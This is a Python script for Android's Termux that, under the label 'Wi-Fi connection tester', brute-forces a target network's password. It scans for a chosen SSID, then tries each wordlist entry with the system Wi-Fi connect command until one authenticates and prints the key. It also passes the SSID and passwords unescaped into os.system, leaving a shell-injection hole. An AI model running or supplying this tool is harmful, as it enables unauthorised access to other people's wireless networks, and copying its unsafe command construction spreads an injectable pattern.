import os
import time
import subprocess

# Standard Terminal Colors
R = '\033[91m'
G = '\033[92m'
B = '\033[94m'
W = '\033[0m'
BOLD = '\033[1m'

def display_banner():
    os.system('clear')
    print(f"{W}{BOLD}" + "="*45)
    print("        WI-FI CONNECTION TESTER")
    print("="*45 + f"{W}")
    print(f"      Status: Standalone Engine Active\n")

def scan_network(target):
    print(f"[*] Checking availability: {target}...")
    try:
        # Using direct Termux-API for scanning
        data = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
        if target in data:
            print(f"{G}[+] SSID found in range.{W}")
            return True
        else:
            print(f"{R}[!] Error: SSID not detected.{W}")
            return False
    except:
        print(f"{R}[-] System Error: Check API and Location services.{W}")
        return False

def initiate_test():
    display_banner()
    
    while True:
        entry = input(f"{BOLD}Type 'start' to proceed: {W}").lower()
        if entry == "start":
            break

    ssid = input("[+] Target SSID: ")
    if not scan_network(ssid):
        return

    wordlist = input("[+] Wordlist Path: ")
    if not os.path.exists(wordlist):
        print(f"{R}[-] Path error: File not found.{W}")
        return

    try:
        with open(wordlist, 'r') as f:
            passwords = f.readlines()
            total = len(passwords)
            print(f"\n{G}[*] Testing authentication for: {ssid}{W}")
            
            for i, p in enumerate(passwords, 1):
                key = p.strip()
                if len(key) < 8: continue
                
                print(f"[*] Attempting [{i}/{total}]: {key}", end='\r')
                
                # Direct Android System command
                os.system(f'cmd wifi connect-with-pass "{ssid}" "{key}"')
                time.sleep(4)
                
                try:
                    # Connection check logic
                    info = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
                    if ssid in info and "ip_address" in info:
                        print(f"\n\n{G}{BOLD}[+] AUTHENTICATED! Key: {key}{W}")
                        return
                except:
                    pass
                
    except KeyboardInterrupt:
        print(f"\n{R}[!] Process halted by user.{W}")

if __name__ == "__main__":
    initiate_test()
